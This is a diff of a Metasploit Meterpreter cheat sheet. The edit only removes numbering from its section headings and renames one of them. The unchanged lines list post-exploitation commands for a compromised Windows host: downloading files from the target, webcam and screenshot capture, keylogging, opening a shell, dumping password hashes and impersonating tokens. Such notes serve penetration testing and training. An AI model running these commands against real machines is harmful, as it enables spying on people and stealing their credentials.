@@ -5,7 +5,7 @@ tags: [security, tool, metasploit]
 
 Meterpreter runs from the memory of the target machine. It allows us to migrate between system processes if required as well
 
-1. <u>Basic System Information</u>
+<u>Basic System Information</u>
 
 ````bash
 getuid 				# View User Info
@@ -23,14 +23,14 @@ whoami /groups
 tasklist /SVC 		# View running processes
 ````
 
-2. <u>Upload & Download File</u>
+<u>Upload & Download File</u>
 
 ````bash
 download <filename> 	# Download file from Target
 upload <filename> <path-on-target>
 ````
 
-3. <u>Capture Image</u>
+<u>Capture Image</u>
 
 ````bash
 webcam_list
@@ -38,7 +38,7 @@ webcam_snap
 screenshot
 ````
 
-4. <u>Keylogger</u>
+<u>Keylogger</u>
 
 ````bash
 keyscan_start
@@ -46,7 +46,7 @@ keyscan_dump 	# View all the keystrokes
 keyscan_stop
 ````
 
-5. <u>Operations on Target</u>
+<u>Operations on Target</u>
 
 ````bash
 shell 					# Launch Shell - To go back use Ctrl + Z
@@ -59,7 +59,7 @@ hashdump 				# Dump Hashes
 
 When using migrate the target process should have the same privilege as the current process and show be of the same architecture as well
 
-6. <u>Run Exploits</u>
+<u>Run Payload</u>
 
 ````bash
 run post/windows/gather/checkvm 				# Check if target is VM
@@ -77,7 +77,7 @@ list_tokens -u 		# View Tokens
 impersonate_token "<token-name>"
 ````
 
-7. <u>Session Management</u>
+<u>Session Management</u>
 
 ````bash
 background
